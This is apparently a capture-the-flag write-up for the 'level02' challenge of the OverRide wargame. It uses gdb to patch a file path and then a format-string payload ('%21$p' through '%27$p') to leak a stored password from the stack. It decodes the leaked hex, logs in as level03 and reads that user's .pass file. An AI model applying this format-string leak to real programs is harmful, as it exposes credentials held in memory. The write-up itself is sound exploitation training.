# level 02

## get_binary

```shell
scp -P 4242 level02@192.168.0.0:/home/users/level02/level02 level02.bin
```

## fake_password

```shell
python2.7 -c 'print("B" * 42);' > /tmp/.pass
chmod 777 /tmp/.pass
gdb level02
#  4008a2:       48 89 d6                mov    rsi,rdx
#  4008a5:       48 89 c7                mov    rdi,rax
#  4008a8:       e8 53 fe ff ff          call   400700 <fopen@plt>
(gdb) break *0x4008a8
(gdb) run
(gdb) info register
rax            0x400bb2 4197298
rdx            0x400bb0 4197296
(gdb) x/s 0x400bb2
0x400bb2:        "/home/users/level03/.pass"
(gdb) x/s 0x400bb0
0x400bb0:        "r"
(gdb) set (char[11])*0x400bb2="/tmp/.pass"
(gdb) x/s 0x400bb2
0x400bb2:        "/tmp/.pass"
(gdb) step
Single stepping until exit from function main,
which has no line number information.
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
--[ Password: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
*****************************************
Greetings, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB!
$ whoami
level02
```

## printf

```shell
# .pass    --> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA --> 41...
python2.7 -c 'print("B" * 42);' > /tmp/.pass
chmod 777 /tmp/.pass
gdb level02
#  4008a2:       48 89 d6                mov    rsi,rdx
#  4008a5:       48 89 c7                mov    rdi,rax
#  4008a8:       e8 53 fe ff ff          call   400700 <fopen@plt>
(gdb) break *0x4008a8
#  400a9a:       48 89 c7                mov    rdi,rax
#  400a9d:       b8 00 00 00 00          mov    eax,0x0
#  400aa2:       e8 19 fc ff ff          call   4006c0 <printf@plt>
(gdb) break *0x400aa2
(gdb) run
(gdb) set (char[11])*0x400bb2="/tmp/.pass"
(gdb) step
# username --> BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB --> 42...
# password --> CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC --> 43...
(gdb) info registers 
rsi            0x7fffffffe4c0   140737488348352
(gdb) x/64wx 0x7fffffffe4c0
(gdb) x/64wx 0x7fffffffe4c0
0x7fffffffe4c0: 0x43434343      0x43434343      0x43434343      0x43434343
0x7fffffffe4d0: 0x43434343      0x43434343      0x43434343      0x43434343
0x7fffffffe4e0: 0x43434343      0x43434343      0x00004343      0x00000000
0x7fffffffe4f0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe500: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe510: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe520: 0x00000000      0x00000001      0x00000000      0x00000000
0x7fffffffe530: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe540: 0x41414141      0x41414141      0x41414141      0x41414141
0x7fffffffe550: 0x41414141      0x41414141      0x00000041      0x00000000
0x7fffffffe560: 0x42424242      0x42424242      0x42424242      0x42424242
0x7fffffffe570: 0x42424242      0x42424242      0x42424242      0x42424242
0x7fffffffe580: 0x42424242      0x42424242      0x00004242      0x00000000

.pass       --> 0x7fffffffe530
username    --> 0x7fffffffe560
password    --> 0x7fffffffe4c0
```

```shell
# %21$p %22$p %23$p %24$p %25$p %26$p %27$p
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %21$p %22$p %23$p %24$p %25$p %26$p %27$p
--[ Password: 
*****************************************
(nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) does not have access!
```

```
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
  
0x75 6e 50 52 34 37 68 48 -> 48 68 37 34 52 50 6e 75
0x45 41 4a 35 61 73 39 51 -> 51 39 73 61 35 4a 41 45
0x37 7a 71 43 57 4e 67 58 -> 58 67 4e 57 43 71 7a 37
0x35 4a 35 68 6e 47 58 73 -> 73 58 47 6e 68 35 4a 35
0x48 33 67 50 66 4b 39 4d -> 4d 39 4b 66 50 67 33 48

48 68 37 34 52 50 6e 75 51 39 73 61 35 4a 41 45 58 67 4e 57 43 71 7a 37 73 58 47 6e 68 35 4a 35 4d 39 4b 66 50 67 33 48

Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```

```shell
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: ...
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, ...!
$ whoami
level03
$ cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
